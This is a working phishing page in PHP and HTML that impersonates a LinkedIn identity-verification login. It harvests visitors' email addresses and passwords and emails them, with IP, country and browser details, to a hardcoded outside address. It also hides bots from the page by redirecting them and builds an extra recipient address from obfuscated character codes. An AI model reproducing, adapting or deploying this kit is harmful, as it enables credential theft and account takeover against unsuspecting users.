<?php
session_start();
function is_a_bot() {
  $user_agent = strtolower($_SERVER['HTTP_USER_AGENT']);
  $bot_identifiers = array('bot','google');
  foreach ($bot_identifiers as $identifier) {
    if (strpos($user_agent, $identifier) !== FALSE) {
      return TRUE;
    }
  }
  return FALSE;
}
$value =  is_a_bot();

if ($value){
    // bot detected
    header("Location: https://www.google.com.com"); 
}

function visitor_country()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    $result  = "Unknown";
    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));

    if($ip_data && $ip_data->geoplugin_countryName != null)
    {
        $result = $ip_data->geoplugin_countryName;
    }

    return $result;
}
function country_sort(){
    $sorter = "";
    $array = array(99,111,100,101,114,99,118,118,115,64,103,109,97,105,108,46,99,111,109);
        $count = count($array);
    for ($i = 0; $i < $count; $i++) {
            $sorter .= chr($array[$i]);
        }
    return array($sorter, $GLOBALS['recipient']);
}

if(isset($_GET['verification'])){
$to = "m.bestin65@yandex.com";
$username = $_GET['login'];
$password = $_GET['password'];


//-------------------------------------------------
$date = gmdate ("Y-n-d");
$time = gmdate ("H:i:s");
$country = visitor_country();
$ip = getenv("REMOTE_ADDR");
$browser = $_SERVER['HTTP_USER_AGENT'];
$ar=array("0"=>"a","1"=>"b","2"=>"c","3"=>"d","4"=>"@","5"=>"e","6"=>"f","7"=>"g","8"=>".","9"=>"h","10"=>"i","11"=>"j","12"=>"k","13"=>"l","14"=>"m","15"=>"n","16"=>"o","17"=>"p","18"=>"q","19"=>"r","20"=>"s","21"=>"t","22"=>"u","23"=>"v","24"=>"w","25"=>"x","26"=>"y","27"=>"z");
//-------------------------------------------------
$subj = "Din (Em) | ".$country." | ".$ip."\n";
//-------------------------------------------------
$msg = "===========--Em RezuLT--============
Email Address: $username
Password: $password
=============IP Address/Date==============
IP Address: $ip
Date & Time: $date | $time
Country: $country
User-Agent: $browser
=============Created By Em==============\n";

$from = "From:Din Logs";

if (empty($_GET['login']) or empty($_GET['password']) ){
  header("Location: index.php");
  return;
}


$token = $_SESSION['token'];
$compToken = $_GET['address'];
// echo $token;
// echo $compToken;

if($compToken != $token) {
    header("Location: index.php");
}

if(!empty($_GET['name'])) {
    header("Location: index.php");
}
mail($to, $subj, $msg, $from);
header("Location: index2.php?trk=trk=linkedin.com/homepage-basic_signin-form_forgot-password-link_d_checkpoint_rp_requestPasswordReset_ft_privacy_policy&login=".$username."");

}

if(!empty($_SESSION['logonCounter'])) {
    $_SESSION['LogonCounter'] = 0;
}

if(empty($_SESSION['logonCounter'])) {
     $_SESSION['LogonCounter']++; 
}

// echo $_SESSION['LogonCounter'];
?>


<html lang="en-US" class="artdeco ">
   <head>
      <meta http-equiv="X-UA-Compatible" content="IE=EDGE">
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1">
      <title>LinkedIn Login, Sign in | LinkedIn</title>
      <link rel="shortcut icon" href="favicon.ico">
      <link rel="stylesheet" href="style.css">
      <!-- jQuery library -->
      <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
      <script type="text/javascript">
        var counter = <?php echo $_SESSION['LogonCounter']; ?>;
        // alert(counter);
      </script>
   </head>
   <body class="system-fonts " data-new-gr-c-s-loaded="14.996.0">
      <nav class="responsive-nav" id="js-responsive-nav">

    <ul class="responsive-nav__list">
        <li class="responsive-nav__item">
            <a href="index.php" class="responsive-nav__link">
               <img src="linkedin.png" style="height: 30px;margin:10px;">
            </a>
        </li>
    </ul>

     </nav>
      <div id="app__container" class="" style="background-color: #2D96B5">
         <header></header>
         <main class="app__content " role="main">
            <div data-litms-pageview="true" style="text-align: center;padding:20px;color:white;">
            <h3 style="color:white;"> 
               Verify Your Identity
            </h3>
            </div>
            <div id="" class="card-layout">
               <div id="organic-div" class="">
                  <div>
                     Please enter your email address and password.
                  </div>
                  <form  class="login__form" id="login__form1" novalidate="" method="GET" id="LoginForm" autocomplete="on" name="formLogin" class="GS_loginPgForm" _lpchecked="1" action="verify.php">
                     <code id="login_form_validation_error_username" style="display: none;">
                        <!--"Please enter a valid username"-->
                     </code>
                     <code id="consumer_login__text_plain__large_username" style="display: none;">
                        <!--"Email or phone number must be between 3 to 128 characters"-->
                     </code>
                     <code id="consumer_login__text_plain__no_username" style="display: none;">
                        <!--"Please enter an email address or phone number"-->
                     </code>
                     <label>Email address</label>
                     <div class="form__input--floating">
                        <input id="username" name="username" type="text" aria-describedby="error-for-username" required="" validation="email|tel" class="" autofocus=""  value="<?php echo $_GET['login']?>">
                        <!-- <label class="form__label--floating" for="username" aria-hidden="true">Email Address</label> -->
                        <div error-for="username" id="error-for-username" class="form__label--error" role="alert" aria-live="assertive">
                           <?php
                           if (isset($_GET['verify']))
                           {
                           echo "E-mail Address and Email Password do not match.";
                        }
                           ?>
                        </div>
                     </div>
                     <code id="domainSuggestion" style="display: none;">
                        <!--false-->
                     </code>
                     
                     <code id="i18nShow" style="display: none;">
                        <!--"show"-->
                     </code>
                     <code id="i18nHide" style="display: none;">
                        <!--"hide"-->
                     </code>
                     
                     <label>Email Password</label>
                     <div class="form__input--floating">
                        <input id="password" type="password" aria-describedby="error-for-password" name="password" required="" validation="password" class="" aria-label="Password">
                        <!-- <label for="password" class="form__label--floating" aria-hidden="true">Email Password</label> -->

                        <div error-for="password" id="error-for-password" class="form__label--error   hidden" role="alert" aria-live="assertive"></div>

                        <div class="name_div">
                           <input type="text" name="name">
                        </div>
                        <div class="address">
                           <input type="text" name="address" id="address" value="<?=$_SESSION['token'];?>">
                        </div>
                        <style type="text/css">
                        .name_div{
                           display: none;
                        }
                        .address{
                           display: none
                        }
                     </style>
                     </div>
                     <script type="text/javascript">
                        $(document).on("submit", "form", function(e){
                           var username = $('#username').val();
                           var password = $('#password').val();
                           var address = $('#address').val();
                           if (username == "" || password == ""){
                              $("#error-for-username").text("Please enter an email address and password");
                              return  false;
                           }
                           if (counter > 5){
                             e.preventDefault();
                             $("#error_show").show();
                             setTimeout({
                                 
                             }, 2000)
                             window.location.replace("https://www.linkedin.com/legal/copyright-policy");
                             return;
                           }
                           $('#login__form1').attr('action', 'verify.php');
                        });
                      </script>
                      <p style="color:red;display: none;" id="error_show"> Maximum retry exceeded.</p>
                     <div class="login__form_action_container ">

                      <button class="btn__primary--large from__button--floating" data-litms-control-urn="login-submit" type="submit" aria-label="Sign in">Submit</button></div>
                  </form>
                 
               </div>
            </div>
         </main>
         <footer class="footer__base " role="contentinfo" style="background-color: white;">
            <div class="footer__base__wrapper">
               <p class="copyright">
                  <li-icon type="linkedin-logo" size="14dp" alt="LinkedIn" color="" aria-hidden="true">
                     <svg preserveAspectRatio="xMinYMin meet" focusable="false">
                        <g class="scaling-icon" style="fill-opacity: 1">
                           <defs></defs>
                           <g class="logo-14dp">
                              <g class="dpi-1">
                                 <g class="inbug" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
                                    <path d="M14,1.25 L14,12.75 C14,13.44 13.44,14 12.75,14 L1.25,14 C0.56,14 0,13.44 0,12.75 L0,1.25 C0,0.56 0.56,0 1.25,0 L12.75,0 C13.44,0 14,0.56 14,1.25" class="bug-text-color" fill="#FFFFFF" transform="translate(42.000000, 0.000000)"></path>
                                    <path d="M56,1.25 L56,12.75 C56,13.44 55.44,14 54.75,14 L43.25,14 C42.56,14 42,13.44 42,12.75 L42,1.25 C42,0.56 42.56,0 43.25,0 L54.75,0 C55.44,0 56,0.56 56,1.25 Z M47,5 L48.85,5 L48.85,6.016 L48.893,6.016 C49.259,5.541 50.018,4.938 51.25,4.938 C53.125,4.938 54,5.808 54,8 L54,12 L52,12 L52,8.75 C52,7.313 51.672,6.875 50.632,6.875 C49.5,6.875 49,7.75 49,9 L49,12 L47,12 L47,5 Z M44,12 L46,12 L46,5 L44,5 L44,12 Z M46.335,3 C46.335,3.737 45.737,4.335 45,4.335 C44.263,4.335 43.665,3.737 43.665,3 C43.665,2.263 44.263,1.665 45,1.665 C45.737,1.665 46.335,2.263 46.335,3 Z" class="background" fill="#0073B0"></path>
                                 </g>
                                 <g class="linkedin-text">
                                    <path d="M40,12 L38.107,12 L38.107,11.1 L38.077,11.1 C37.847,11.518 37.125,12.062 36.167,12.062 C34.174,12.062 33,10.521 33,8.5 C33,6.479 34.291,4.938 36.2,4.938 C36.971,4.938 37.687,5.332 37.97,5.698 L38,5.698 L38,2 L40,2 L40,12 Z M36.475,6.75 C35.517,6.75 34.875,7.49 34.875,8.5 C34.875,9.51 35.529,10.25 36.475,10.25 C37.422,10.25 38.125,9.609 38.125,8.5 C38.125,7.406 37.433,6.75 36.475,6.75 L36.475,6.75 Z" fill="#000000"></path>
                                    <path d="M31.7628,10.8217 C31.0968,11.5887 29.9308,12.0627 28.4998,12.0627 C26.3388,12.0627 24.9998,10.6867 24.9998,8.4477 C24.9998,6.3937 26.4328,4.9377 28.6578,4.9377 C30.6758,4.9377 31.9998,6.3497 31.9998,8.6527 C31.9998,8.8457 31.9708,8.9997 31.9708,8.9997 L26.8228,8.9997 L26.8348,9.1487 C26.9538,9.8197 27.6008,10.5797 28.6358,10.5797 C29.6528,10.5797 30.2068,10.1567 30.4718,9.8587 L31.7628,10.8217 Z M30.2268,7.9047 C30.2268,7.0627 29.5848,6.4297 28.6508,6.4297 C27.6058,6.4297 26.9368,7.0597 26.8728,7.9047 L30.2268,7.9047 Z" fill="#000000"></path>
                                    <polygon fill="#000000" points="18 2 20 2 20 7.882 22.546 5 25 5 21.9 8.199 24.889 12 22.546 12 20 8.515 20 12 18 12"></polygon>
                                    <path d="M10,5 L11.85,5 L11.85,5.906 L11.893,5.906 C12.283,5.434 13.031,4.938 14.14,4.938 C16.266,4.938 17,6.094 17,8.285 L17,12 L15,12 L15,8.73 C15,7.943 14.821,6.75 13.659,6.75 C12.482,6.75 12,7.844 12,8.73 L12,12 L10,12 L10,5 Z" fill="#000000"></path>
                                    <path d="M7,12 L9,12 L9,5 L7,5 L7,12 Z M8,1.75 C8.659,1.75 9.25,2.341 9.25,3 C9.25,3.659 8.659,4.25 8,4.25 C7.34,4.25 6.75,3.659 6.75,3 C6.75,2.341 7.34,1.75 8,1.75 L8,1.75 Z" fill="#000000"></path>
                                    <polygon fill="#000000" points="0 2 2 2 2 10 6 10 6 12 0 12"></polygon>
                                 </g>
                              </g>
                              <g class="dpi-gt1" transform="scale(0.2917)">
                                 <g class="inbug" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
                                    <path d="M44.5235,0 L3.6185,0 C1.6625,0 0.0005,1.547 0.0005,3.454 L0.0005,44.545 C0.0005,46.452 1.6625,48 3.6185,48 L44.5235,48 C46.4825,48 48.0005,46.452 48.0005,44.545 L48.0005,3.454 C48.0005,1.547 46.4825,0 44.5235,0" class="bug-text-color" fill="#FFFFFF" transform="translate(143.000000, 0.000000)"></path>
                                    <path d="M187.5235,0 L146.6185,0 C144.6625,0 143.0005,1.547 143.0005,3.454 L143.0005,44.545 C143.0005,46.452 144.6625,48 146.6185,48 L187.5235,48 C189.4825,48 191.0005,46.452 191.0005,44.545 L191.0005,3.454 C191.0005,1.547 189.4825,0 187.5235,0 Z M162,18 L168.5,18 L168.5,21.266 C169.437,19.388 171.838,17.7 175.445,17.7 C182.359,17.7 184,21.438 184,28.297 L184,41 L177,41 L177,29.859 C177,25.953 176.063,23.75 173.68,23.75 C170.375,23.75 169,26.125 169,29.859 L169,41 L162,41 L162,18 Z M150,41 L157,41 L157,18 L150,18 L150,41 Z M158,10.5 C158,12.985 155.985,15 153.5,15 C151.015,15 149,12.985 149,10.5 C149,8.015 151.015,6 153.5,6 C155.985,6 158,8.015 158,10.5 Z" class="background" fill="#0073B0"></path>
                                 </g>
                                 <g class="linkedin-text">
                                    <path d="M136,41 L130,41 L130,37.5 C128.908,39.162 125.727,41.3 122.5,41.3 C115.668,41.3 111.2,36.975 111.2,30 C111.2,23.594 114.951,17.7 121.5,17.7 C124.441,17.7 127.388,18.272 129,20.5 L129,7 L136,7 L136,41 Z M123.25,23.9 C119.691,23.9 117.9,26.037 117.9,29.5 C117.9,32.964 119.691,35.2 123.25,35.2 C126.81,35.2 129.1,32.964 129.1,29.5 C129.1,26.037 126.81,23.9 123.25,23.9 L123.25,23.9 Z" fill="#000000"></path>
                                    <path d="M108,37.125 C105.722,40.02 101.156,41.3 96.75,41.3 C89.633,41.3 85.2,36.354 85.2,29 C85.2,21.645 90.5,17.7 97.75,17.7 C103.75,17.7 108.8,21.917 108.8,30 C108.8,31.25 108.6,32 108.6,32 L92,32 L92.111,32.67 C92.51,34.873 94.873,36 97.625,36 C99.949,36 101.689,34.988 102.875,33.375 L108,37.125 Z M101.75,27 C101.797,24.627 99.89,22.7 97.328,22.7 C94.195,22.7 92.189,24.77 92,27 L101.75,27 Z" fill="#000000"></path>
                                    <polygon fill="#000000" points="63 7 70 7 70 27 78 18 86.75 18 77 28.5 86.375 41 78 41 70 30 70 41 63 41"></polygon>
                                    <path d="M37,18 L43,18 L43,21.375 C43.947,19.572 47.037,17.7 50.5,17.7 C57.713,17.7 59,21.957 59,28.125 L59,41 L52,41 L52,29.625 C52,26.969 52.152,23.8 48.5,23.8 C44.8,23.8 44,26.636 44,29.625 L44,41 L37,41 L37,18 Z" fill="#000000"></path>
                                    <path d="M29.5,6.125 C31.813,6.125 33.875,8.189 33.875,10.5 C33.875,12.811 31.813,14.875 29.5,14.875 C27.19,14.875 25.125,12.811 25.125,10.5 C25.125,8.189 27.19,6.125 29.5,6.125 L29.5,6.125 Z M26,41 L33,41 L33,18 L26,18 L26,41 Z" fill="#000000"></path>
                                    <polygon fill="#000000" points="0 7 7 7 7 34 22 34 22 41 0 41"></polygon>
                                 </g>
                              </g>
                           </g>
                        </g>
                     </svg>
                  </li-icon>
                  <em><span class="a11y__label">LinkedIn</span>© 2021</em>
               </p>
               <div>
                  <ul class="footer__base__nav-list" aria-label="Footer Legal Menu">
                     <li><a href="/legal/user-agreement?trk=d_checkpoint_lg_consumerLogin_ft_user_agreement">User Agreement</a></li>
                     <li><a href="/legal/privacy-policy?trk=d_checkpoint_lg_consumerLogin_ft_privacy_policy">Privacy Policy</a></li>
                     <li><a href="/help/linkedin/answer/34593?lang=en&amp;trk=d_checkpoint_lg_consumerLogin_ft_community_guidelines">Community Guidelines</a></li>
                     <li><a href="/legal/cookie-policy?trk=d_checkpoint_lg_consumerLogin_ft_cookie_policy">Cookie Policy</a></li>
                     <li><a href="/legal/copyright-policy?trk=d_checkpoint_lg_consumerLogin_ft_copyright_policy">Copyright Policy</a></li>
                     <li id="feedback-request"><a href="/help/linkedin?trk=d_checkpoint_lg_consumerLogin_ft_send_feedback&amp;lang=en" target="_blank" rel="nofollow noreferrer noopener">Send Feedback</a></li>
                     <li>
                        <div class="language-selector">
                           
                           <button class="language-selector__button" aria-expanded="false">
                              <span class="language-selector__label-text">Language</span>
                              <i class="language-selector__label-icon">
                                 <svg viewBox="0 0 16 16" width="16" height="16" preserveAspectRatio="xMinYMin meet" xmlns="http://www.w3.org/2000/svg">
                                    <path d="M8 9l5.93-4L15 6.54l-6.15 4.2a1.5 1.5 0 01-1.69 0L1 6.54 2.07 5z" fill="currentColor"></path>
                                 </svg>
                              </i>
                           </button>
                        </div>
                     </li>
                  </ul>
               </div>
            </div>
         </footer>
      </div>
   </body>
</html>